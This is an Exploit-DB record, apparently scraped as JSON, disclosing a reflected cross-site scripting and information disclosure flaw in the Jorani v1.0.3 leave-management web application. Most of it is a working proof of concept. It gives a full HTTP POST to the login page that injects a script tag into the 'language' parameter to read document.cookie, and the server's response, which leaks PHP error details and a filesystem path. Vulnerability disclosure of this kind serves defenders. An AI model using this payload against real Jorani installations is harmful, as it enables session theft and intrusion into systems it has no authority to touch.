{"source": "https://www.exploit-db.com/exploits/51715", "vulnName": "Jorani v1.0.3-(c)2014-2023 - XSS Reflected & Information Disclosure", "vulnEDBID": "51715", "vulnCVE": "N/A", "author": "NU11SECUR1TY", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-09-08", "vulnContent": "## Title: Jorani v1.0.3-(c)2014-2023 - XSS Reflected & Information Disclosure\n## Author: nu11secur1ty\n## Date: 08/27/2023\n## Vendor: https://jorani.org/\n## Software: https://demo.jorani.org/session/login\n## Reference: https://portswigger.net/web-security/cross-site-scripting\n## Reference: https://portswigger.net/web-security/information-disclosure\n\n## Description:\nThe value of the `language request` parameter is copied into a\nJavaScript string which is encapsulated in double quotation marks. The\npayload 75943\";alert(1)//569 was submitted in the language parameter.\nThis input was echoed unmodified in the application's response.\nThe attacker can modify the token session and he can discover\nsensitive information for the server.\n\nSTATUS: HIGH-Vulnerability\n\n[+]Exploit:\n```POST\nPOST /session/login HTTP/1.1\nHost: demo.jorani.org\nAccept-Encoding: gzip, deflate\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111\nSafari/537.36\nConnection: close\nCache-Control: max-age=0\nCookie: csrf_cookie_jorani=9b4b02ece59e0f321cd0324a633b5dd2;\njorani_session=fbc630d2510ffdd2a981ccfe97301b1b90ab47dc#ATTACK\nOrigin: http://demo.jorani.org\nUpgrade-Insecure-Requests: 1\nReferer: http://demo.jorani.org/session/login\nContent-Type: application/x-www-form-urlencoded\nSec-CH-UA: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"116\", \"Chromium\";v=\"116\"\nSec-CH-UA-Platform: Windows\nSec-CH-UA-Mobile: ?0\nContent-Length: 183\n\ncsrf_test_jorani=9b4b02ece59e0f321cd0324a633b5dd2&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ennois&login=bbalet&CipheredValue=\n\n```\n\n[+]Response:\n```HTTP\nHTTP/1.1 200 OK\ndate: Sun, 27 Aug 2023 06:03:04 GMT\ncontent-type: text/html; charset=UTF-8\nContent-Length: 681\nserver: Apache\nx-powered-by: PHP/8.2\nexpires: Thu, 19 Nov 1981 08:52:00 GMT\ncache-control: no-store, no-cache, must-revalidate\npragma: no-cache\nset-cookie: csrf_cookie_jorani=9b4b02ece59e0f321cd0324a633b5dd2;\nexpires=Sun, 27 Aug 2023 08:03:04 GMT; Max-Age=7200; path=/;\nSameSite=Strict\nset-cookie: jorani_session=9ae823ffa74d722c809f6bda69954593483f2cfd;\nexpires=Sun, 27 Aug 2023 08:03:04 GMT; Max-Age=7200; path=/; HttpOnly;\nSameSite=Lax\nlast-modified: Sun, 27 Aug 2023 06:03:04 GMT\nvary: Accept-Encoding\ncache-control: private, no-cache, no-store, proxy-revalidate,\nno-transform, must-revalidate\npragma: no-cache\nx-iplb-request-id: 3E497A1D:118A_D5BA2118:0050_64EAE718_12C0:1FBA1\nx-iplb-instance: 27474\nconnection: close\n\n\n<div style=\"border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;\">\n\n<h4>A PHP Error was encountered</h4>\n\n<p>Severity: 8192</p>\n<p>Message:  strlen(): Passing null to parameter #1 ($string) of type\nstring is deprecated</p>\n<p>Filename: controllers/Connection.php</p>\n<p>Line Number: 126</p>\n\n\n</div>\n<div style=\"border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;\">\n\n<h4>A PHP Error was encountered</h4>\n\n<p>Severity: Warning</p>\n<p>Message:  Cannot modify header information - headers already sent\nby (output started at\n/home/decouvric/demo.jorani.org/system/core/Exceptions.php:272)</p>\n<p>Filename: helpers/url_helper.php</p>\n<p>Line Number: 565</p>\n\n\n</div>\n```\n\n\n## Reproduce:\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/Jorani/2023/Jorani-v1.0.3-%C2%A92014-2023-Benjamin-BALET-XSS-Reflected-Information-Disclosure)\n\n## Proof and Exploit:\n[href](https://www.nu11secur1ty.com/2023/08/jorani-v103-2014-2023-benjamin-balet.html)\n\n## Time spend:\n01:35:00\n            "}